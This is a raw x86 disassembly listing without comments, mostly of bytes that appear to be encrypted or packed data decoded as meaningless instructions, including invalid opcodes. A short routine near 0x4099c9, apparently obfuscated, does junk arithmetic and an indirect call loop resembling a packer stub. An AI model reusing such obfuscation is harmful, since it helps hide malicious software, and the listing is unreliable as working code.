  40996b:	xchg   BYTE PTR [edx-0x4aca19b1],dl
  409971:	lds    esi,FWORD PTR [ebx+esi*4]
  409974:	out    dx,eax
  409975:	mov    dl,0xb7
  409977:	rcl    eax,0xb1
  40997a:	ret    0xbba1
  40997d:	test   eax,0xd4c16223
  409982:	or     al,0x26
  409984:	js     0x4099cd
  409986:	fist   WORD PTR [ebx]
  409988:	sar    BYTE PTR [edx-0x47dc20d9],0xc5
  40998f:	mov    ds:0xd436ebe,al
  409994:	imul   edi,esi,0x6f
  409997:	test   BYTE PTR [edx-0x54],ch
  40999a:	cmp    BYTE PTR [edx-0x336ae479],ah
  4099a0:	bound  esi,QWORD PTR [edx]
  4099a2:	test   al,0x1e
  4099a4:	imul   DWORD PTR [ebx-0x14355c44]
  4099aa:	(bad)  
  4099ab:	int    0xe9
  4099ad:	iret   
  4099ae:	inc    edx
  4099af:	popa   
  4099b0:	iret   
  4099b1:	hlt    
  4099b2:	pop    es
  4099b3:	dec    edx
  4099b4:	and    BYTE PTR [ecx-0x62],dl
  4099b7:	mov    edi,0x78c5d6e1
  4099bc:	xchg   edx,eax
  4099bd:	data16 mov al,ds:0x13bbaa8
  4099c3:	or     BYTE PTR [edi+0x5e],bl
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	mul    DWORD PTR [ebp+ecx*4-0x77]
  409a5c:	jns    0x4099e5
  409a5e:	in     al,dx
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x4099e6
  409a66:	std    
  409a67:	jbe    0x409a55
  409a69:	scas   al,BYTE PTR es:[edi]
  409a6a:	jmp    0x20378fa6
  409a6f:	lahf   
  409a70:	push   cs
  409a71:	mov    WORD PTR [edx+0x249f591a],?
  409a77:	mov    WORD PTR [ebx-0x1ff07a4a],es
  409a7d:	mov    dl,0xc9
  409a7f:	inc    edx
  409a80:	inc    edi
  409a81:	(bad)  
  409a82:	push   ds
  409a83:	pop    edi
  409a84:	cld    
  409a85:	stos   DWORD PTR es:[edi],eax
  409a86:	fisubr WORD PTR [ecx+eiz*4]
  409a89:	fwait
  409a8a:	push   ebx
  409a8b:	jnp    0x409aee
  409a8d:	or     BYTE PTR [ecx+0x4a4d0ed9],bh
  409a93:	fsub   DWORD PTR [esi+0x69]
  409a96:	cs lahf 
  409a98:	xchg   esp,eax
  409a99:	retf   0x307d
  409a9c:	adc    dl,bl
  409a9e:	adc    ecx,esp
  409aa0:	xor    BYTE PTR ds:0x4690d1cf,0x6
  409aa7:	jl     0x409b18
  409aa9:	(bad)  
  409aaa:	fdivr  QWORD PTR [eax+0x54]
  409aad:	mov    edx,0x53396d65
  409ab2:	mov    bl,0xbb
  409ab4:	icebp  
  409ab5:	lods   eax,DWORD PTR ds:[esi]
  409ab6:	jle    0x409b09
  409ab8:	cmp    BYTE PTR [ecx],bl
  409aba:	inc    ecx
  409abb:	jge    0x409af2
  409abd:	cwde   
  409abe:	mov    dh,bh
  409ac0:	jmp    0xf7aadf79
  409ac5:	xchg   edx,eax
  409ac6:	aad    0xe5
  409ac8:	ss popf 
  409aca:	lahf   
  409acb:	sub    ebp,esp
  409acd:	pop    edi
  409ace:	scas   al,BYTE PTR es:[edi]
  409acf:	push   ebp
  409ad0:	inc    DWORD PTR [edi+0x5d]
  409ad3:	and    eax,0x18d81cbb
  409ad8:	push   es
  409ad9:	fwait
  409ada:	lock jle 0x409b28
  409add:	dec    ebp
  409ade:	mov    cl,dh
  409ae0:	push   esi
  409ae1:	jp     0x409add
  409ae3:	stos   BYTE PTR es:[edi],al
  409ae4:	cmp    al,0x68
  409ae6:	push   0x1bacd13d
  409aeb:	dec    ebx
  409aec:	loopne 0x409acf
  409aee:	inc    eax
  409aef:	lock mov ebx,0xca0131e4
  409af5:	sub    eax,0x6a76e87a
  409afa:	mov    al,0x71
  409afc:	push   es
  409afd:	mov    ebx,0x73b40c9b
  409b02:	(bad)  
  409b03:	push   0xe011ec7b
  409b08:	out    dx,eax
  409b09:	mov    eax,ds:0xe2b22a04
  409b0e:	ret    0x893c
  409b11:	mov    edx,0x22942279
  409b16:	pusha  
  409b17:	adc    eax,0xcb048db2
  409b1c:	shl    BYTE PTR [eax],cl
  409b1e:	mov    eax,ds:0xe2fefd97
  409b23:	retf   0xf9f6
  409b26:	popa   
  409b27:	inc    esp
  409b28:	es pop ss
  409b2a:	repz (bad) 
  409b2d:	jmp    0xce5c:0xca583782
  409b34:	add    dl,BYTE PTR [esi]
  409b36:	(bad)
  409b39:	and    cl,BYTE PTR [eax]
  409b3b:	rdtsc  
  409b3d:	push   esp
  409b3e:	out    0xb7,al
  409b40:	in     eax,0x9
  409b42:	sbb    DWORD PTR ds:0xaee6d49a,ebp
  409b48:	inc    eax
  409b49:	sub    dl,ah
  409b4b:	in     al,0xf9
  409b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b4e:	jo     0x409af4
  409b50:	pop    edx
  409b51:	jae    0x409ae2
  409b53:	add    ah,BYTE PTR [edx+0x43]
  409b56:	jne    0x409b97
  409b58:	imul   edx,DWORD PTR ss:[esi-0x58],0x6c
  409b5d:	sbb    BYTE PTR [ecx-0x6],0x3b
  409b61:	adc    ecx,DWORD PTR [esi+0x1a]
  409b64:	dec    esi
  409b65:	pop    DWORD PTR [edi-0x5fbcaf90]
  409b6b:	cmp    DWORD PTR ds:[esi],edx
  409b6e:	lods   al,BYTE PTR ds:[esi]
  409b6f:	aad    0xe9
  409b71:	test   al,0x77
  409b73:	cwde   
  409b74:	pop    ds
  409b75:	push   cs
  409b76:	adc    ah,0xa
  409b79:	imul   edi,DWORD PTR [edi-0x3017eb20],0x1ac6105f
  409b83:	imul   esi,DWORD PTR [edi+0xf59a966],0x328b946d
  409b8d:	or     eax,0x30f1ae34
  409b92:	add    al,0x9c
  409b94:	inc    edx
  409b95:	mov    ch,0xa0
  409b97:	(bad)  
  409b98:	push   ecx
  409b99:	sub    BYTE PTR [ebx-0x4e2e644],0xcd
  409ba0:	or     edx,DWORD PTR [edi+0x6389c15e]
  409ba6:	fistp  WORD PTR [ecx+edi*1]
  409ba9:	fistp  WORD PTR [eax-0x4]
  409bac:	add    ebx,ebp
  409bae:	adc    al,0xd9
  409bb0:	ficomp DWORD PTR [edx+0x73f8615]
  409bb6:	adc    DWORD PTR [eax+0x74f75007],esp
  409bbc:	adc    al,0x9b
  409bbe:	cdq    
  409bbf:	fwait
  409bc0:	cdq    
  409bc1:	pmullw mm7,mm7
  409bc4:	sub    DWORD PTR [edi-0x40],ebp
  409bc7:	inc    ecx
  409bc8:	scas   eax,DWORD PTR es:[edi]
  409bc9:	mov    ecx,ecx
  409bcb:	add    DWORD PTR [esi+0x5c9f8d78],esp
  409bd1:	stc    
  409bd2:	mov    edx,0x82b6d4b0
  409bd7:	inc    al
  409bd9:	jno    0x409b9c
  409bdb:	pop    ebx
  409bdc:	dec    edi
  409bdd:	outs   dx,DWORD PTR ds:[esi]
  409bde:	imul   eax,DWORD PTR [edi],0xdc9a1e9e
  409be4:	xchg   esp,eax
  409be5:	scas   al,BYTE PTR es:[edi]
  409be6:	inc    edx
  409be7:	popa   
  409be8:	repz out dx,al
  409bea:	popf   
  409beb:	imul   eax,DWORD PTR [ecx+0x595811a2],0x65
  409bf2:	shl    BYTE PTR [ecx+edx*8+0x37],1
  409bf6:	fld    QWORD PTR [eax]
  409bf8:	mov    dh,0xc0
  409bfa:	cmp    DWORD PTR [edi],eax
  409bfc:	add    eax,0xd1710fa2
  409c01:	adc    BYTE PTR [esp+edi*1],cl
  409c04:	inc    ebx
  409c05:	bound  esp,QWORD PTR ds:0xa4d75fc8
  409c0b:	dec    edi
  409c0c:	pusha  
  409c0d:	imul   ebp,DWORD PTR [eax-0x719fbb62],0x8
  409c14:	test   DWORD PTR [ecx+0x7a],ecx
  409c17:	sti    
  409c18:	jbe    0x409c61
  409c1a:	and    ebx,DWORD PTR [ebx+0x4b8661e8]
  409c20:	sub    al,0x64
  409c22:	cmp    DWORD PTR [edx+0x12],edx
  409c25:	inc    esi
  409c26:	push   0xf39add14
  409c2b:	mov    eax,ds:0xcf757c1
  409c30:	aaa    
  409c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c32:	daa    
  409c33:	mov    cs,WORD PTR [edx+0x48]
  409c36:	xchg   esi,eax
  409c37:	ja     0x409c66
  409c39:	mov    edx,0xcda4a346
  409c3e:	sti    
  409c3f:	jmp    0xc475f56c
  409c44:	cmp    al,0xa7
  409c46:	and    bh,BYTE PTR ds:0xbdd1c14f
  409c4c:	xor    BYTE PTR [ecx+esi*8],dh
  409c4f:	cli    
  409c50:	leave  
  409c51:	add    bl,BYTE PTR [ebp-0x6bd50bf]
  409c57:	scas   al,BYTE PTR es:[edi]
  409c58:	imul   edx
  409c5a:	rol    BYTE PTR ds:0x7c9d9e44,0x26
  409c61:	pop    edi
  409c62:	sub    bl,ah
  409c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c65:	hlt    
  409c66:	aam    0x7f
  409c68:	pop    ebp
  409c69:	fimul  DWORD PTR [edi-0x7f]
  409c6c:	fdivr  st(3),st
  409c6e:	sahf   
  409c6f:	mov    DWORD PTR ss:[eax+0x3f5e973a],edi
  409c76:	pop    edi
  409c77:	ret    
  409c78:	add    eax,0x7fb83cd1
  409c7d:	push   edi
  409c7e:	ffreep st(2)
  409c80:	lock push edx
  409c82:	dec    esp
  409c83:	lods   eax,DWORD PTR ds:[esi]
  409c84:	sbb    DWORD PTR [ebx+0x13],ebx
  409c87:	cmp    ch,ch
  409c89:	in     eax,0xd
  409c8b:	fidivr WORD PTR [ecx-0xbce3f84]
  409c91:	les    ebx,FWORD PTR [ebp+edx*8-0x40c3106a]
  409c98:	sbb    BYTE PTR [ebx],0x7c
  409c9b:	or     al,BYTE PTR [ebx]
  409c9d:	pop    ecx
  409c9e:	and    edi,DWORD PTR [edi+0x17fef106]
  409ca4:	test   ah,bh
  409ca6:	pop    edx
  409ca7:	sub    esp,esp
  409ca9:	pop    ecx
  409caa:	xchg   edx,eax
  409cab:	mov    bh,0x68
  409cad:	in     eax,dx
  409cae:	test   BYTE PTR [edi-0x6f],dh
  409cb1:	pop    ecx
  409cb2:	pop    esp
  409cb3:	jnp    0x409d16
  409cb5:	call   0x29bfe4bc
  409cba:	sahf   
  409cbb:	data16 loop 0x409d00
  409cbe:	into   
  409cbf:	or     ebx,DWORD PTR [ebx+0x71]
  409cc2:	sti    
  409cc3:	outs   dx,DWORD PTR ds:[esi]
  409cc4:	repnz push esp
  409cc6:	call   0x49d5:0x770416f3
  409ccd:	xor    cl,al
  409ccf:	sbb    eax,0xfc6c8a9e
  409cd4:	mov    ebx,0xdcc3b452
  409cd9:	call   0xe18cfe86
  409cde:	mov    cs,WORD PTR [eax-0x3a]
  409ce1:	and    BYTE PTR ds:0x9a3d3f12,cl
  409ce7:	mov    ds:0xa6ce7bc7,al
  409cec:	or     esp,edi
  409cee:	adc    al,0x10
  409cf0:	sbb    esp,DWORD PTR ds:0x8724
  409cf5:	iret   
  409cf6:	or     eax,0x92b0eb83
  409cfb:	mov    dh,ah
  409cfd:	mov    bl,0x74
  409cff:	loopne 0x409cde
  409d01:	or     cl,BYTE PTR [esi]
  409d03:	mov    edi,0x823c131
  409d08:	arpl   WORD PTR [ebx],dx
  409d0a:	out    0x4b,al
  409d0c:	hlt    
  409d0d:	sbb    DWORD PTR [esi],ebx
  409d0f:	scas   al,BYTE PTR es:[edi]
  409d10:	cdq    
  409d11:	or     ch,bh
  409d13:	dec    esp
  409d14:	ret    
  409d15:	cmp    esi,DWORD PTR [edx]
  409d17:	push   esp
  409d18:	or     cl,cl
  409d1a:	xor    al,0xc4
  409d1c:	push   edx
  409d1d:	mov    dh,0x3c
  409d1f:	push   eax
  409d20:	mov    ds:0x2d734024,al
  409d25:	int3   
  409d26:	sbb    BYTE PTR [edi*2+0x443b5927],0x83
  409d2e:	repz mov ebx,0x44ea4e64
  409d34:	in     eax,0xcf
  409d36:	in     al,dx
  409d37:	inc    eax
  409d38:	cmp    eax,0x92f27cf8
  409d3d:	mov    ah,0x53
  409d3f:	div    ch
  409d41:	dec    edi
  409d42:	add    eax,0xcc3cb76a
  409d47:	or     ebp,DWORD PTR [esi+0x26]
  409d4a:	cli    
  409d4b:	pop    ecx
  409d4c:	std    
  409d4d:	mov    ds:0x3ae52b78,al
  409d52:	not    DWORD PTR [eax+0x33]
  409d55:	cmp    eax,0x51f488fc
  409d5a:	sub    BYTE PTR [ebx],0xd6
  409d5d:	test   al,0x85
  409d5f:	dec    edi
  409d60:	je     0x409d07
  409d62:	sbb    al,0xe6
  409d64:	sbb    ebx,ebp
  409d66:	in     al,dx
  409d67:	int3   
  409d68:	push   esi
  409d69:	dec    esi
  409d6a:	pop    edx
  409d6b:	ins    BYTE PTR es:[edi],dx
  409d6c:	mov    edi,0x72539a19
  409d71:	popf   
  409d72:	sub    BYTE PTR [edi],dl
  409d74:	icebp  
  409d75:	xor    ah,BYTE PTR [esi+0x1f609aac]
  409d7b:	sbb    BYTE PTR [ebp+0x42],bh
  409d7e:	xor    DWORD PTR [ecx],ecx
  409d80:	add    al,0x32
  409d82:	inc    esp
  409d83:	sbb    eax,0xe8802f66
  409d88:	out    0x83,al
  409d8a:	imul   ecx
  409d8c:	mov    ah,0x54
  409d8e:	vpor   ymm3,ymm3,YMMWORD PTR [ecx+0x1c]
  409d93:	mov    bl,0x7b
  409d95:	es sub al,0xde
  409d98:	mov    dh,0x25
  409d9a:	jg     0x409d8c
  409d9c:	ja     0x409dac
  409d9e:	inc    ebx
  409da0:	mov    DWORD PTR [edi-0x8],ebp
  409da3:	test   ecx,eax
  409da5:	mov    eax,ds:0x7a0d4fd4
  409daa:	idiv   DWORD PTR [eax]
  409dac:	lods   eax,DWORD PTR ds:[esi]
  409dad:	xor    BYTE PTR [ecx-0x23],al
  409db0:	sub    al,0x96
  409db2:	jbe    0x409d66
  409db4:	and    esp,ecx
  409db6:	adc    BYTE PTR [ebx-0x7a3baddf],bl
  409dbc:	add    bh,BYTE PTR [edi+eax*4-0x5a]
  409dc0:	or     eax,0xe1440134
  409dc5:	jnp    0x409d50
  409dc7:	(bad)  
  409dc8:	sbb    esi,DWORD PTR [ebx-0x616a32cc]
  409dce:	inc    esp
  409dcf:	ss fwait
  409dd1:	sbb    al,0x86
  409dd3:	in     al,0xd7
  409dd5:	sbb    DWORD PTR [eax+0x7597cb40],0x54118466
  409ddf:	dec    eax
  409de0:	mov    ds,WORD PTR [ebx-0x1]
  409de3:	sub    bl,bh
  409de5:	mov    ds:0x3fc3d4,al
  409dea:	xchg   BYTE PTR [ecx+eiz*2],dh
  409ded:	lods   eax,DWORD PTR ds:[esi]
  409dee:	test   BYTE PTR [ebx],dl
  409df0:	inc    ecx
  409df1:	jb     0x409d73
  409df3:	mov    cl,0xaf
  409df5:	push   ecx
  409df6:	fistp  QWORD PTR [edi+eax*2-0x7f3d02b0]
  409dfd:	pop    ecx
  409dfe:	adc    DWORD PTR [ebx-0x16],esi
  409e01:	push   ss
  409e02:	xchg   DWORD PTR [edi-0x2efc20f9],ebx
  409e08:	xor    DWORD PTR ds:0x42fd8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	das    
  409e82:	add    ebx,ebx
  409e84:	add    esp,DWORD PTR [esi]
  409e86:	call   0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e8e:	lock aas 
  409e90:	cmc    
  409e91:	je     0x409ebf
  409e93:	mov    dh,0x89
  409e95:	fcmovu st,st(0)
  409e97:	mov    ecx,0x6d15d18b
  409e9c:	fmul   QWORD PTR [esi]
  409e9e:	push   ss
  409e9f:	mov    ds:0x85f31d8b,eax
  409ea4:	xchg   BYTE PTR [eax-0x1fd54df3],ah
  409eaa:	adc    bl,BYTE PTR [edi+0x7b]
  409ead:	sbb    DWORD PTR [eax],ecx
  409eaf:	aas    
  409eb0:	in     al,dx
  409eb1:	inc    eax
  409eb2:	stos   BYTE PTR es:[edi],al
  409eb3:	repz aam 0x3b
  409eb6:	pextrw esi,(bad),0xc5
  409eb8:	jae    0x409edf
  409eba:	sub    bl,dl
  409ebc:	gs pop es
  409ebe:	cmp    BYTE PTR [ecx+0x30],bh
  409ec1:	loope  0x409e6c
  409ec3:	lds    ebx,FWORD PTR [edi-0x50]
  409ec6:	xchg   ecx,eax
  409ec7:	inc    esp
  409ec8:	xlat   BYTE PTR ds:[ebx]
  409ec9:	pop    ebp
  409eca:	jb     0x409ed8
  409ecc:	fs pop eax
  409ece:	cmovle edi,ebp
  409ed1:	hlt    
  409ed2:	iret   
  409ed3:	fdiv   DWORD PTR [edx-0x2e]
  409ed6:	int3   
  409ed7:	xor    eax,DWORD PTR ds:0xc79a081a
  409edd:	add    ah,dl
  409edf:	bnd jb 0x409f60
  409ee2:	shl    BYTE PTR ds:0x6603dfdc,0xe9
  409ee9:	sbb    eax,0x260f6563
  409eee:	cmc    
  409eef:	xor    esp,DWORD PTR [edx]
  409ef1:	test   DWORD PTR ds:0x327bc865,esp
  409ef7:	jle    0x409ec7
  409ef9:	push   ds
  409efa:	cli    
  409efb:	cmp    cl,al
  409efd:	mov    ebx,DWORD PTR [ecx+edi*4]
  409f00:	inc    esi
  409f01:	mov    ds:0xab3c787c,al
  409f06:	inc    edx
  409f07:	and    edi,DWORD PTR [edx]
  409f09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f0a:	mov    dh,0xb7
  409f0c:	loopne 0x409f76
  409f0e:	sbb    DWORD PTR [ecx+0x5f086fd9],ebx
  409f14:	stc    
  409f15:	popa   
  409f16:	test   BYTE PTR [edi+0x67],bh
  409f19:	push   ebp
  409f1a:	pop    esp
  409f1b:	push   0xffffffee
  409f1d:	mov    bl,BYTE PTR [edi-0x7e10f5b8]
  409f23:	or     al,BYTE PTR [esi+0x6]
  409f26:	add    BYTE PTR [eax+0x40],0x6b
  409f2a:	inc    esi
  409f2b:	out    dx,eax
  409f2c:	test   eax,0xb938a136
  409f31:	loop   0x409f1d
  409f33:	xlat   BYTE PTR ds:[ebx]
  409f34:	(bad)  
  409f35:	stc    
  409f36:	pop    eax
  409f37:	fs inc edx
  409f39:	lock aas 
  409f3b:	scas   al,BYTE PTR es:[edi]
  409f3c:	mov    ebp,0x63affcce
  409f41:	and    ah,BYTE PTR [eax-0x9]
  409f44:	jge    0x409f36
  409f46:	sub    ah,BYTE PTR ds:[ebp+0x4ed4237c]
  409f4d:	inc    esp
  409f4e:	nop
  409f4f:	ins    DWORD PTR es:[edi],dx
  409f50:	mov    esi,0x962fe9f1
  409f55:	aas    
  409f56:	inc    ebx
  409f57:	sub    DWORD PTR [esi+0x65],edx
  409f5a:	arpl   WORD PTR es:[ebx],dx
  409f5d:	icebp  
  409f5e:	aad    0x81
  409f60:	call   0x4a10aa02
  409f65:	clc    
  409f66:	mov    BYTE PTR [edx],bl
  409f68:	mov    edi,DWORD PTR [edx-0x1c]
  409f6b:	popf   
  409f6c:	fcomp  QWORD PTR ds:0x912ecf2a
  409f72:	mov    esi,0x5d46afac
  409f77:	push   ds
  409f78:	inc    esp
  409f79:	retf   0xa987
  409f7c:	push   ss
  409f7d:	aaa    
  409f7e:	daa    
  409f7f:	fs mov ebx,0xfb1d6693
  409f85:	push   0x27cbb889
  409f8a:	xchg   esi,eax
  409f8b:	pusha  
  409f8c:	mov    esi,0x455e6a93
  409f91:	(bad)  
  409f92:	loopne 0x409f8b
  409f94:	repnz push ecx
  409f96:	aam    0x5c
  409f98:	inc    ecx
  409f99:	cmp    edx,DWORD PTR [eax+esi*2+0x72]
  409f9d:	inc    esi
  409f9e:	int3   
  409f9f:	aas    
  409fa0:	sahf   
  409fa1:	or     ebp,eax
  409fa3:	mov    ch,0x8b
  409fa5:	xlat   BYTE PTR ds:[ebx]
  409fa6:	adc    al,0xe8
  409fa8:	or     BYTE PTR [edx-0x29],dl
  409fab:	out    dx,eax
  409fac:	mov    eax,ds:0x3ab80e49
  409fb1:	pop    ebp
  409fb2:	rcl    dh,cl
  409fb4:	jnp    0x409f7c
  409fb6:	clc    
  409fb7:	push   ss
  409fb8:	pop    es
  409fb9:	hlt    
  409fba:	fmul   DWORD PTR [esi]
  409fbc:	lods   al,BYTE PTR ds:[esi]
  409fbd:	push   ds
  409fbe:	jge    0x40a02e
  409fc0:	(bad)  
  409fc1:	hlt    
  409fc2:	and    BYTE PTR [ebp-0x3b],al
  409fc5:	fwait
  409fc6:	aas    
  409fc7:	out    dx,al
  409fc8:	ins    DWORD PTR es:[edi],dx
  409fc9:	add    esp,ebx
  409fcb:	(bad)  
  409fcc:	mov    esp,0xb6145514
  409fd1:	retf   
  409fd2:	std    
  409fd3:	jns    0x40a032
  409fd5:	in     eax,dx
  409fd6:	popa   
  409fd7:	or     edi,0xffffffb0
  409fda:	rdpmc  
  409fdc:	stos   DWORD PTR es:[edi],eax
  409fdd:	adc    DWORD PTR [ebp-0x6178fc78],ebp
  409fe3:	imul   eax,DWORD PTR [edx-0x7d],0xffffff82
  409fe7:	adc    DWORD PTR [edi],esp
  409fe9:	out    dx,eax
  409fea:	push   0xf
  409fec:	pusha  
  409fed:	xchg   edi,eax
  409fee:	lahf   
  409fef:	repz push eax
  409ff1:	pusha  
  409ff2:	adc    BYTE PTR ds:0xad90009c,dh
  409ff8:	push   0x5bf22e58
  409ffd:	inc    ebp
  409ffe:	mov    dh,0xad
  40a000:	adc    edx,DWORD PTR [edi+eax*8+0x6c]
  40a004:	pop    esp
  40a005:	push   ss
  40a006:	fs jle 0x409fcd
  40a009:	or     DWORD PTR [edx+ecx*1+0x2d],esp
  40a00d:	xchg   edi,eax
  40a00e:	idiv   BYTE PTR [ebx]
  40a010:	(bad)  
  40a012:	push   edx
  40a013:	clc    
  40a014:	loope  0x409fe6
  40a016:	sub    eax,0x585a253d
  40a01b:	push   esp
  40a01c:	std    
  40a01d:	jns    0x409ffa
  40a01f:	mov    ds:0xf3f0f7b3,eax
  40a024:	mov    cs,WORD PTR [ebp+edx*4-0x27]
  40a028:	mov    ecx,0xa4616cb6
  40a02d:	in     eax,dx
  40a02e:	add    bl,BYTE PTR [edi]
  40a030:	ffree  st(2)
  40a032:	cld    
  40a033:	and    DWORD PTR [esi],0xffffffd1
  40a036:	stos   DWORD PTR es:[edi],eax
  40a037:	sub    dh,BYTE PTR [esi+ebp*4]
  40a03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a03b:	dec    esp
  40a03c:	xchg   esp,eax
  40a03d:	ins    DWORD PTR es:[edi],dx
  40a03e:	xchg   esi,eax
  40a03f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a040:	lods   eax,DWORD PTR ds:[esi]
  40a041:	mov    edx,0x2e7fadd6
  40a046:	hlt    
  40a047:	into   
  40a048:	xchg   esp,eax
  40a049:	mov    ebx,0x2ae3a45f
  40a04e:	pushf  
  40a04f:	add    bh,dh
  40a051:	mov    esi,0xcdcb9f99
  40a056:	lds    ecx,FWORD PTR [esp+ebx*8+0x3b]
  40a05a:	aam    0xb7
  40a05c:	fxam   
  40a05e:	sub    bh,BYTE PTR [ecx-0x64b769f0]
  40a064:	rol    BYTE PTR [edi-0x57],cl
  40a067:	and    cl,al
  40a069:	jns    0x40a08f
  40a06b:	call   0x792:0x3665bf5c
  40a072:	(bad)  
  40a073:	lock int 0x1f
  40a076:	and    eax,0x74cbb6d8
  40a07b:	push   esp
  40a07c:	fcmovnbe st,st(0)
  40a07e:	xchg   ebx,eax
  40a07f:	repnz xchg ebx,eax
  40a081:	and    ebp,DWORD PTR [eax]
  40a083:	lds    esp,FWORD PTR [esi+eiz*8-0x49]
  40a087:	ret    
  40a088:	cmp    dh,BYTE PTR [eax-0x51]
  40a08b:	inc    esi
  40a08c:	mov    eax,?
  40a08e:	sbb    ch,BYTE PTR [esi+0x2f9bade3]
  40a094:	jge    0x40a026
  40a096:	(bad)  
  40a097:	clc    
  40a098:	shl    BYTE PTR [ebp+0x17790dd5],0x6a
  40a09f:	add    esp,DWORD PTR [ecx]
  40a0a1:	fldenv [edi+edx*8-0x63]
  40a0a5:	mov    ecx,0xc307cb2c
  40a0aa:	imul   eax,DWORD PTR [ebx-0x41029f97],0x24
  40a0b1:	xor    eax,0x848556ee
  40a0b6:	mov    cl,0x49
  40a0b8:	shr    DWORD PTR [eax+edi*4],0xd0
  40a0bc:	jnp    0x40a0cd
  40a0be:	and    esp,esi
  40a0c0:	jnp    0x40a044
  40a0c2:	inc    edi
  40a0c3:	xor    ebx,DWORD PTR [ecx]
  40a0c5:	and    eax,0x1e0d6ce1
  40a0ca:	neg    DWORD PTR [esi+0x4b]
  40a0cd:	adc    al,0x8c
  40a0cf:	test   DWORD PTR [ebx],esp
  40a0d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0d2:	sub    ecx,DWORD PTR [eax]
  40a0d4:	lea    ecx,[edx+0x3314599f]
  40a0da:	dec    edi
  40a0db:	push   esi
  40a0dc:	xchg   esp,eax
  40a0dd:	xchg   ebx,eax
  40a0de:	test   ah,ch
  40a0e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0e1:	add    DWORD PTR [ecx-0x44fee226],ebx
  40a0e7:	sbb    ebx,edx
  40a0e9:	sbb    BYTE PTR [edi+0x4378a784],0xdb
  40a0f0:	mov    eax,ds:0xf2570586
  40a0f5:	loope  0x40a15e
  40a0f7:	icebp  
  40a0f8:	xor    DWORD PTR [edi-0x73],edi
  40a0fb:	inc    esp
  40a0fc:	aam    0x37
  40a0fe:	cmp    BYTE PTR [ebx],ah
  40a100:	add    ebx,ebp
  40a102:	push   ds
  40a103:	xchg   ecx,eax
  40a104:	ins    BYTE PTR es:[edi],dx
  40a105:	xchg   ebx,eax
  40a106:	sbb    dl,ah
  40a108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a10a:	fs push esi
  40a10c:	mov    ch,0x6a
  40a10e:	bound  ebp,QWORD PTR [eax+0x61]
  40a111:	inc    ebx
  40a112:	push   ds
  40a113:	push   es
  40a114:	sbb    ebx,DWORD PTR [eax+0x28]
  40a117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a118:	pop    ebx
  40a119:	sub    eax,0x53d19f5a
  40a11e:	fbstp  TBYTE PTR [ebx]
  40a120:	outs   dx,BYTE PTR ds:[esi]
  40a121:	or     eax,0x146088a7
  40a126:	inc    esp
  40a127:	mov    ebx,0x978dd688
  40a12c:	and    eax,0x7e230f48
  40a131:	fcmovnb st,st(3)
  40a133:	outs   dx,BYTE PTR ds:[esi]
  40a134:	jnp    0x40a162
  40a136:	and    eax,0x45ed6ac2
